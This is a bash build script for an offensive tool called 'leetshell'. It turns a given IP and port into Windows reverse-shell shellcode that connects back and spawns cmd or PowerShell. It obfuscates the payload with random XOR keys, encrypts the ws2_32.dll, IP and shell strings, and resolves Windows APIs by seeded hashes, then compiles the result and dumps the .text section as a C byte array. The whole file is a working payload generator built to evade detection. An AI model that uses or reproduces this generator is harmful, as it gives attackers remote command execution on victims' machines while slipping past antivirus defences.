#!/bin/bash

echo "
[31m
██╗     ███████╗███████╗████████╗ ███████╗██╗  ██╗███████╗██╗     ██╗      
██║     ██╔════╝██╔════╝╚══██╔══╝ ██╔════╝██║  ██║██╔════╝██║     ██║ 
██║     █████╗  █████╗     ██║    ███████╗███████║█████╗  ██║     ██║      
██║     ██╔══╝  ██╔══╝     ██║    ╚════██║██╔══██║██╔══╝  ██║     ██║ 
███████╗███████╗███████╗   ██║    ███████║██║  ██║███████╗███████╗███████╗ 
╚══════╝╚══════╝╚══════╝   ╚═╝    ╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝
[33m Copyright © 2025 jarednexgent (https://github.com/jarednexgent) [0m 
"

# === validate args ===
if [ $# -lt 2 ]; then
  echo "[!] Usage: $0 <ip> <port> [cmd|powershell] [--raw]"
  exit 1
fi

filename="src/leetshell.c"
ip=$1
port=$2
shell_type="cmd"
raw_output=false

# === Parse optional args ===
for arg in "${@:3}"; do
  if [ "$arg" == "--raw" ]; then
    raw_output=true
  elif [ "$arg" == "cmd" ] || [ "$arg" == "powershell" ]; then
    shell_type="$arg"
  fi
done

len=${#ip}
lastChar=$((len - 1))

# === Generate random XOR keys ===
xor_key1=$((RANDOM % 256))
xor_hex1=$(printf '0x%02x' $xor_key1)

xor_key2=$((RANDOM % 256))
xor_hex2=$(printf '0x%02x' $xor_key2)

xor_key3=$((RANDOM % 256))
xor_hex3=$(printf '0x%02x' $xor_key3)

# === Update KEY values defined in src/leetshell.c ===
sed -i "s/^#define KEY1.*/#define KEY1 $xor_hex1/" "$filename"
sed -i "s/^#define KEY2.*/#define KEY2 $xor_hex2/" "$filename"
sed -i "s/^#define KEY3.*/#define KEY3 $xor_hex3/" "$filename"

# === Generate SEED and HASH values ===
seed=$(( (RANDOM % 255) + 1 ))
mask=$((0xFFFFFFFF))

apis=(
  "LoadLibraryA"
  "CreateProcessA"
  "WSAStartup"
  "WSASocketA"
  "connect"
)

hash_loselose() {
  local s="$1" h=0 b
  while IFS= read -r b; do
    (( h = (h + b) & mask ))
    (( h = ( h * (b + seed) ) & mask ))
  done < <(printf '%s' "$s" | LC_ALL=C od -An -t u1 -v | tr -s ' ' '\n' | sed '/^$/d')
  # force unsigned decimal
  if (( h < 0 )); then
    printf '%u' "$(( h & mask ))"
  else
    printf '%u' "$h"
  fi
}

for sym in "${apis[@]}"; do
  val="$(hash_loselose "$sym")"
  printf -v "$sym" '%u' "$val"
  export "$sym"
done

# === Update SEED and HASH values defined in src/leetshell.c ===
sed -i "s/^#define SEED.*/#define SEED                $seed/" "$filename"
sed -i "s/^#define LOADLIBRARYA_H.*/#define LOADLIBRARYA_H      $LoadLibraryA/" "$filename"
sed -i "s/^#define CREATEPROCESSA_H.*/#define CREATEPROCESSA_H    $CreateProcessA/" "$filename"
sed -i "s/^#define WSASTARTUP_H.*/#define WSASTARTUP_H        $WSAStartup/" "$filename"
sed -i "s/^#define WSASOCKETA_H.*/#define WSASOCKETA_H        $WSASocketA/" "$filename"
sed -i "s/^#define CONNECT_H.*/#define CONNECT_H           $connect/" "$filename"

# === XOR encrypt ws2_32.dll string ===
ws2="ws2_32.dll"
encoded_ws2="{"
for (( i=0; i<${#ws2}; i++ )); do
  byte=$(printf "%d" "'${ws2:$i:1}")
  xor_byte=$((byte ^ xor_key1))
  encoded_ws2+=$(printf "0x%02x, " $xor_byte)
done
encoded_ws2+=$(printf "0x%02x" $xor_key1)
encoded_ws2+="}"

# === Format and XOR encrypt IP ====
IFS=. read -r o0 o1 o2 o3 <<< "$ip" || { echo "Invalid IPv4: $ip" >&2; exit 1; }
for o in "$o0" "$o1" "$o2" "$o3"; do
  [[ "$o" =~ ^[0-9]+$ ]] && (( o >= 0 && o <= 255 )) || { echo "Invalid IPv4: $ip" >&2; exit 1; }
done

k=$(( xor_key2 & 0xFF ))
b0=$(( (10#$o0 ^ k) & 0xFF ))
b1=$(( (10#$o1 ^ k) & 0xFF ))
b2=$(( (10#$o2 ^ k) & 0xFF ))
b3=$(( (10#$o3 ^ k) & 0xFF ))

printf -v ip_array "{0x%02x, 0x%02x, 0x%02x, 0x%02x, 0x%02x}" "$b0" "$b1" "$b2" "$b3" "$k"

# === XOR encrypt shell string ===
if [ "$shell_type" == "cmd" ]; then
  shell_str="cmd"
else
  shell_str="powershell"
fi

encoded_shell="{"
for (( i=0; i<${#shell_str}; i++ )); do
  byte=$(printf "%d" "'${shell_str:$i:1}")
  xor_byte=$((byte ^ xor_key3))
  encoded_shell+=$(printf "0x%02x, " $xor_byte)
done
encoded_shell+=$(printf "0x%02x" $xor_key3)
encoded_shell+="}"

# === Patch the C source ===
sed -i "s/char cmd\[\] = .*;/char cmd[] = $encoded_shell;/" "$filename"
sed -i "s/char ws2_32_dll\[\] = .*;/char ws2_32_dll[] = $encoded_ws2;/" "$filename"
sed -i "s/unsigned char ip\[\] = .*;/unsigned char ip\[\] = $ip_array;/g" "$filename"
sed -i "s/int port =.*;/int port = $port ;/g" "$filename"

# === build payload ===
make -C src leetshell > /dev/null 2>&1
if [ $? -ne 0 ]; then
  echo "[!] Build failed!"
  exit 1
fi

# === extract shellcode ===
objcopy -O binary --only-section=.text src/leetshell.exe shellcode.bin

# === handle output ===
if [ "$raw_output" = true ]; then
  echo "[+] Raw binary saved as shellcode.bin"
else
  echo "unsigned char buf[] = {"
  hexdump -v -e '16/1 "0x%02x, " "\n"' shellcode.bin | sed '$s/, $//'  # strip trailing comma
  echo "};"
  rm -f shellcode.bin
fi

# === clean up ===
rm -f src/leetshell.exe src/*.o
